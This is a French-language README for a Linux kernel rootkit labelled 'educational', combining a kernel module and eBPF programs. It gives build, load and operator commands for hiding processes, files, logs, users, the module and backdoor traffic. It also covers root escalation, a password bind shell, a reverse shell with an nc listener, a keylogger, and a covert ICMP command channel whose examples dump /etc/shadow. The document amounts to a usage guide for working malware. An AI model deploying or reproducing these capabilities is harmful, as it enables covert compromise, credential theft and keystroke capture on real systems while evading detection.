# Rootkit Linux - Module Noyau Educatif

Projet educatif de developpement d'un rootkit sous forme de module noyau Linux (LKM).
Le rootkit combine deux approches :
- **Module noyau (LKM)** : utilise **ftrace** pour hooker les appels systeme et **kprobes** pour resoudre les symboles noyau
- **eBPF** : programmes XDP et tracepoints pour la manipulation reseau et la surveillance systeme

**Architecture** : x86-64  
**Interface** : peripherique misc `/dev/rootkit` + commandes ioctl + maps BPF  
**Acces** : restreint aux UID 0 (root) et 1000  

## Compilation

```bash
make            # compile tout : module noyau + userspace + eBPF
make modules    # module noyau seul
make userspace  # binaire rootkit_malware seul
make ebpf       # programmes eBPF + loader seul
make clean      # nettoie tous les fichiers generes
```

**Dependances eBPF** : `clang`, `libbpf-dev`, `libelf-dev`, `zlib1g-dev`

## Chargement / Dechargement

```bash
sudo insmod rootkit.ko    # charger le module
sudo rmmod rootkit         # decharger le module
```

## Programme compagnon (userspace)

Le binaire `rootkit_malware` permet de controler le rootkit depuis l'espace utilisateur :

```bash
./rootkit_malware <commande> [arguments]
```

---

## Fonctionnalites

### 1. Dissimulation de processus (multi-PID)

Masque jusqu'a **16 processus** simultanement dans `/proc`. Les entrees correspondantes sont filtrees du syscall `getdents64`, rendant les processus invisibles a `ps`, `top`, `htop`, etc.

```bash
./rootkit_malware hide_pid 1234      # cacher un processus
./rootkit_malware hide_pid 5678      # cacher un deuxieme processus
./rootkit_malware unhide_pid 1234    # rendre un processus visible a nouveau
```

**Hook** : `__x64_sys_getdents64`  
**ioctl** : `RK_CMD_HIDE_PID` (1), `RK_CMD_UNHIDE_PID` (10)

---

### 2. Dissimulation de fichiers et services

Filtre automatiquement les entrees de repertoire correspondant au nom du module (`rootkit`) et au service cache (`network-helper.service`) dans tous les listings de repertoire.

**Hook** : `__x64_sys_getdents64`

---

### 3. Dissimulation du module noyau

Deux mecanismes complementaires :

- **Liste chainee** : `list_del_init()` retire le module de la liste des modules noyau, le rendant invisible a `lsmod`
- **Kobject** : `kobject_del()` supprime l'entree `/sys/module/rootkit`
- **Filtrage /proc/modules** : le hook `read` supprime la ligne du module dans `/proc/modules`

Le module se cache **automatiquement au chargement**.

```bash
./rootkit_malware hide_mod     # cacher le module (fait automatiquement)
./rootkit_malware show_mod     # rendre le module visible (necessaire avant rmmod)
```

**ioctl** : `RK_CMD_HIDE_MODULE` (6), `RK_CMD_SHOW_MODULE` (7)

---

### 4. Dissimulation de la persistance

Filtre les lectures du fichier `/etc/rc.local` pour supprimer toute ligne contenant `insmod`, masquant ainsi le mecanisme de persistance du rootkit.

**Hook** : `__x64_sys_read`

---

### 5. Dissimulation des logs (dmesg / syslog)

Intercepte les lectures sur `/dev/kmsg`, `/proc/kmsg`, `/var/log/syslog` et `/var/log/kern.log` pour supprimer toute ligne contenant le mot `rootkit`. Empeche `dmesg` de reveler la presence du module.

**Hook** : `__x64_sys_read`

---

### 6. Dissimulation de connexions reseau

#### TCP
Filtre `/proc/net/tcp` pour masquer le port du backdoor des outils comme `netstat`, `ss`, etc.

**Hook** : `tcp4_seq_show`

#### UDP
Filtre egalement `/proc/net/udp` pour une dissimulation complete des connexions reseau.

**Hook** : `udp4_seq_show`

---

### 7. Dissimulation d'utilisateur

Filtre les lectures de `/etc/passwd` et `/etc/shadow` pour supprimer les lignes correspondant a un nom d'utilisateur specifie. L'utilisateur cache devient invisible a `cat /etc/passwd`, `getent passwd`, etc.

```bash
./rootkit_malware hide_user backdoor_user    # cacher un utilisateur
./rootkit_malware unhide_user                # arreter de cacher l'utilisateur
```

**Hook** : `__x64_sys_read`  
**ioctl** : `RK_CMD_HIDE_USER` (11)

---

### 8. Escalade de privileges

Deux methodes d'escalade :

#### Par PID
Utilise `prepare_kernel_cred(NULL)` et `commit_creds()` pour donner les privileges root a un processus specifique.

```bash
./rootkit_malware privesc_pid 1234
```

#### Par commande
Execute une commande arbitraire en tant que root via `call_usermodehelper()`.

```bash
./rootkit_malware privesc_cmd "id > /tmp/proof.txt"
```

**ioctl** : `RK_CMD_PRIVESC` (0)

---

### 9. Backdoor reseau (bind shell)

Ouvre un socket TCP en ecoute sur un port configurable. A la connexion, le client envoie un mot de passe ; si valide, un shell root (`/bin/sh`) est lance via `call_usermodehelper()`.

Le port est automatiquement masque dans `/proc/net/tcp` et `/proc/net/udp`.

```bash
./rootkit_malware backdoor_pass "s3cr3t"    # definir le mot de passe
./rootkit_malware backdoor 4444             # ouvrir le backdoor sur le port 4444
```

Connexion depuis l'attaquant :
```bash
echo "s3cr3t" | nc <cible> 4444
```

**ioctl** : `RK_CMD_OPEN_BACKDOOR` (4), `RK_CMD_SET_BACKDOOR_PASS` (5)

---

### 10. Reverse shell (connexion sortante)

Lance un shell inverse vers une adresse IP et un port specifies. Plus utile que le bind shell lorsque la cible est derriere un NAT ou un pare-feu.

Le shell est lance dans un thread noyau separe via `call_usermodehelper()` avec `/bin/bash`.

```bash
./rootkit_malware revshell 10.0.0.1:4444
```

Cote attaquant, ecouter avec :
```bash
nc -lvnp 4444
```

**ioctl** : `RK_CMD_REVERSE_SHELL` (14)

---

### 11. Keylogger

Enregistre les frappes clavier en s'inscrivant comme handler dans le sous-systeme `input` du noyau. Les scancodes sont convertis en caracteres lisibles (disposition US QWERTY) et stockes dans un buffer circulaire de 4 Ko protege par spinlock.

```bash
./rootkit_malware keylog_toggle    # activer / desactiver le keylogger
./rootkit_malware keylog_read      # lire et vider le buffer de frappes
```

**ioctl** : `RK_CMD_TOGGLE_KEYLOG` (9), `RK_CMD_GET_KEYLOG` (8)

---

### 12. Protection de fichiers

Empeche la suppression (`rm`, `unlink`) et le renommage (`mv`, `rename`) de fichiers critiques en hookant les syscalls `unlinkat` et `renameat2`. Toute tentative retourne `-EACCES`. Supporte jusqu'a **8 fichiers proteges** simultanement.

```bash
./rootkit_malware protect /etc/rc.local     # proteger un fichier
./rootkit_malware protect rootkit.ko        # proteger le module lui-meme
./rootkit_malware unprotect /etc/rc.local   # retirer la protection
```

**Hooks** : `__x64_sys_unlinkat`, `__x64_sys_renameat2`  
**ioctl** : `RK_CMD_PROTECT_FILE` (12), `RK_CMD_UNPROTECT_FILE` (13)

---

### 13. Signal magique (toggle global)

Permet d'activer ou desactiver **toutes les fonctionnalites de dissimulation** du rootkit en envoyant le signal **63** au PID 1. Cette methode ne necessite pas d'acces au peripherique `/dev/rootkit`.

- **ON** : toutes les dissimulations sont actives, le module est cache de `lsmod`
- **OFF** : toutes les dissimulations sont desactivees, le module redevient visible

```bash
./rootkit_malware toggle       # bascule ON/OFF
# ou directement :
kill -63 1
```

**Hook** : `__x64_sys_kill`

---

### 14. Canal de communication secondaire

Permet d'injecter un message dans le fichier `/tmp/.rk_cmd`. Lorsqu'un processus autorise lit ce fichier, le contenu reel est remplace par le message defini via ioctl.

```bash
./rootkit_malware msg "I am Gr00t"
cat /tmp/.rk_cmd    # affiche "I am Gr00t"
```

**ioctl** : `RK_CMD_SET_MSG` (3)

---

### 15. Recuperation de l'UID courant

Commande utilitaire pour verifier l'UID du processus appelant.

```bash
./rootkit_malware uid
```

**ioctl** : `RK_CMD_GETUID` (2)

---

## Resume des hooks syscall

| Hook                       | Syscall / Fonction    | Fonctionnalite                              |
|----------------------------|-----------------------|---------------------------------------------|
| `new_getdents64`           | `__x64_sys_getdents64`| Dissimulation fichiers, services, processus |
| `new_read`                 | `__x64_sys_read`      | Filtrage modules, logs, passwd, persistance |
| `new_tcp4_seq_show`        | `tcp4_seq_show`       | Dissimulation connexions TCP                |
| `new_udp4_seq_show`        | `udp4_seq_show`       | Dissimulation connexions UDP                |
| `new_kill`                 | `__x64_sys_kill`      | Signal magique toggle                       |
| `new_unlinkat`             | `__x64_sys_unlinkat`  | Protection fichiers (suppression)           |
| `new_renameat2`            | `__x64_sys_renameat2` | Protection fichiers (renommage)             |

## Resume des commandes ioctl

| Commande                   | N°  | Direction | Description                          |
|----------------------------|-----|-----------|--------------------------------------|
| `RK_CMD_PRIVESC`           | 0   | W         | Escalade de privileges               |
| `RK_CMD_HIDE_PID`          | 1   | W         | Cacher un PID                        |
| `RK_CMD_GETUID`            | 2   | R         | Lire l'UID courant                   |
| `RK_CMD_SET_MSG`           | 3   | W         | Definir message canal secondaire     |
| `RK_CMD_OPEN_BACKDOOR`     | 4   | WR        | Ouvrir backdoor TCP                  |
| `RK_CMD_SET_BACKDOOR_PASS` | 5   | WR        | Definir mot de passe backdoor        |
| `RK_CMD_HIDE_MODULE`       | 6   | W         | Cacher le module de lsmod            |
| `RK_CMD_SHOW_MODULE`       | 7   | W         | Rendre le module visible             |
| `RK_CMD_GET_KEYLOG`        | 8   | R         | Lire le buffer keylogger             |
| `RK_CMD_TOGGLE_KEYLOG`     | 9   | W         | Activer/desactiver keylogger         |
| `RK_CMD_UNHIDE_PID`        | 10  | W         | Rendre un PID visible                |
| `RK_CMD_HIDE_USER`         | 11  | W         | Cacher un utilisateur                |
| `RK_CMD_PROTECT_FILE`      | 12  | W         | Proteger un fichier                  |
| `RK_CMD_UNPROTECT_FILE`    | 13  | W         | Retirer la protection d'un fichier   |
| `RK_CMD_REVERSE_SHELL`     | 14  | W         | Lancer un reverse shell              |

---

## Fonctionnalites eBPF

Les programmes eBPF fonctionnent **independamment** du module noyau. Ils sont charges depuis l'espace utilisateur via `libbpf` et s'attachent a des points d'accroche XDP (reseau) ou tracepoints (systeme). La communication entre noyau et userspace se fait via des **BPF maps** (hash maps, arrays, ring buffers).

Le loader unifie est : `ebpf/rk_ebpf_loader`

```bash
sudo ./ebpf/rk_ebpf_loader <commande> [args]
```

---

### 16. Dissimulation de paquets reseau (XDP anti-tcpdump)

Programme **XDP** qui inspecte chaque paquet entrant au niveau le plus bas de la pile reseau (avant `AF_PACKET`). Si le port source ou destination correspond a un port cache, le paquet est silencieusement **DROP** avant meme qu'il n'atteigne la couche de capture.

**Resultat** : les paquets du backdoor sont completement invisibles a `tcpdump`, `wireshark`, `tshark` et tout outil base sur `AF_PACKET`/`libpcap`.

```bash
# Attacher le filtre XDP sur l'interface reseau
sudo ./ebpf/rk_ebpf_loader xdp_attach eth0

# Activer le filtrage
sudo ./ebpf/rk_ebpf_loader xdp_enable

# Cacher le port du backdoor
sudo ./ebpf/rk_ebpf_loader xdp_hide_port 4444

# Rendre un port visible a nouveau
sudo ./ebpf/rk_ebpf_loader xdp_unhide_port 4444

# Desactiver le filtrage (sans detacher)
sudo ./ebpf/rk_ebpf_loader xdp_disable

# Detacher completement le programme XDP
sudo ./ebpf/rk_ebpf_loader xdp_detach eth0
```

**Programme BPF** : `ebpf/xdp_hide.bpf.c`  
**Type** : XDP (`BPF_PROG_TYPE_XDP`)  
**Maps** :
- `hidden_ports` (hash) : ports a cacher (cle = port, valeur = 1)
- `xdp_enabled` (array) : flag d'activation (0 = off, 1 = on)

---

### 17. Moniteur d'execution (tracepoint execve)

Programme **tracepoint** qui se branche sur `sched:sched_process_exec` pour capturer **chaque execution de programme** sur le systeme. Les informations collectees sont :

- **PID** du nouveau processus
- **UID** de l'utilisateur
- **PPID** du processus parent
- **comm** (nom du processus)
- **filename** (chemin complet de l'executable)

Les evenements sont transmis en temps reel au userspace via un **ring buffer BPF**.

```bash
# Attacher le moniteur et afficher en temps reel
sudo ./ebpf/rk_ebpf_loader exec_watch

# Exemple de sortie :
# [EXEC] pid=12345  uid=1000  ppid=1234   comm=bash             file=/usr/bin/ls
# [EXEC] pid=12346  uid=0     ppid=1       comm=cron             file=/usr/sbin/logrotate

# Attacher sans affichage (mode daemon)
sudo ./ebpf/rk_ebpf_loader exec_attach
```

**Programme BPF** : `ebpf/exec_monitor.bpf.c`  
**Type** : Tracepoint (`BPF_PROG_TYPE_TRACEPOINT`)  
**Maps** :
- `exec_events` (ring buffer, 256 Ko) : evenements d'execution
- `exec_enabled` (array) : flag d'activation

---

### 18. Canal C2 covert via ICMP

Programme **XDP** qui intercepte les paquets **ICMP Echo Request** (ping) contenant un motif magique (`0xDEAD1337`) dans le payload. La commande cachee dans le reste du payload est extraite, transmise au userspace via ring buffer, puis executee. Le paquet ICMP est ensuite **DROP** pour ne laisser aucune trace reseau.

Ce mecanisme permet un canal de **commande et controle (C2)** totalement covert :
- Le trafic ressemble a un simple ping
- Les paquets C2 ne sont jamais delivres a la pile reseau (drop XDP)
- Aucune connexion TCP/UDP n'est ouverte
- Invisible aux IDS/IPS bases sur les connexions

```bash
# Cote cible : attacher et ecouter les commandes C2
sudo ./ebpf/rk_ebpf_loader c2_watch eth0

# Cote attaquant : envoyer une commande cachee dans un ping
sudo python3 ebpf/icmp_c2_send.py 192.168.1.100 "id > /tmp/.rk_out"
sudo python3 ebpf/icmp_c2_send.py 192.168.1.100 "cat /etc/shadow > /tmp/.rk_shadow"

# Attacher sans ecoute (mode daemon)
sudo ./ebpf/rk_ebpf_loader c2_attach eth0

# Detacher le canal C2
sudo ./ebpf/rk_ebpf_loader c2_detach eth0
```

**Programme BPF** : `ebpf/icmp_c2.bpf.c`  
**Script attaquant** : `ebpf/icmp_c2_send.py`  
**Type** : XDP (`BPF_PROG_TYPE_XDP`)  
**Maps** :
- `icmp_cmd_events` (ring buffer, 256 Ko) : commandes recues
- `icmp_c2_enabled` (array) : flag d'activation  
**Magic** : `0xDEAD1337` (4 octets en debut de payload ICMP)

---

## Architecture eBPF

```
                     Espace utilisateur
    ┌─���────────────────────────────────────────────┐
    │  rk_ebpf_loader          icmp_c2_send.py     │
    │    │                        │                 │
    │    ├─ libbpf (chargement)   └─ raw socket     │
    │    ├─ ring_buffer (lecture)     ICMP           │
    │    └─ bpf maps (config)                       │
    └────────┬──────────────────────────────────────┘
             │  BPF syscall
    ═════════╪══════════════════════════════════════════
             │  Espace noyau
    ┌────���───┴──────────────────────────────────────┐
    │                                               │
    │  XDP hook (NIC driver)                        │
    │    ├─ xdp_hide.bpf.o     → DROP ports caches │
    │    └─ icmp_c2.bpf.o      → DROP + extract C2 │
    │                                               │
    │  Tracepoint (sched_process_exec)              │
    │    └─ exec_monitor.bpf.o → ring buffer events │
    │                                               │
    │  BPF Maps (donnees partagees)                 │
    │    ├─ hidden_ports   (hash)                   │
    │    ├─ xdp_enabled    (array)                  │
    │    ├─ exec_events    (ringbuf)                │
    │    ├─ exec_enabled   (array)                  │
    │    ├─ icmp_cmd_events(ringbuf)                │
    │    └─ icmp_c2_enabled(array)                  ��
    └───────────────────────────────────────────────┘
```

## Resume des programmes eBPF

| Programme            | Type       | Fonctionnalite                          | Maps                              |
|----------------------|------------|-----------------------------------------|-----------------------------------|
| `xdp_hide.bpf.o`    | XDP        | Drop paquets vers/depuis ports caches   | `hidden_ports`, `xdp_enabled`     |
| `exec_monitor.bpf.o`| Tracepoint | Surveillance de toutes les executions   | `exec_events`, `exec_enabled`     |
| `icmp_c2.bpf.o`     | XDP        | Canal C2 covert via ICMP ping           | `icmp_cmd_events`, `icmp_c2_enabled` |

## Commandes du loader eBPF

| Commande                        | Description                              |
|---------------------------------|------------------------------------------|
| `xdp_attach <iface>`           | Attacher le filtre XDP                   |
| `xdp_detach <iface>`           | Detacher le filtre XDP                   |
| `xdp_hide_port <port>`         | Cacher un port du trafic capture         |
| `xdp_unhide_port <port>`       | Rendre un port visible                   |
| `xdp_enable`                   | Activer le filtre XDP                    |
| `xdp_disable`                  | Desactiver le filtre XDP                 |
| `exec_watch`                   | Surveiller les executions en temps reel  |
| `exec_attach`                  | Attacher le moniteur sans affichage      |
| `c2_watch <iface>`             | Ecouter les commandes C2 ICMP           |
| `c2_attach <iface>`            | Attacher le C2 sans ecoute              |
| `c2_detach <iface>`            | Detacher le canal C2                     |
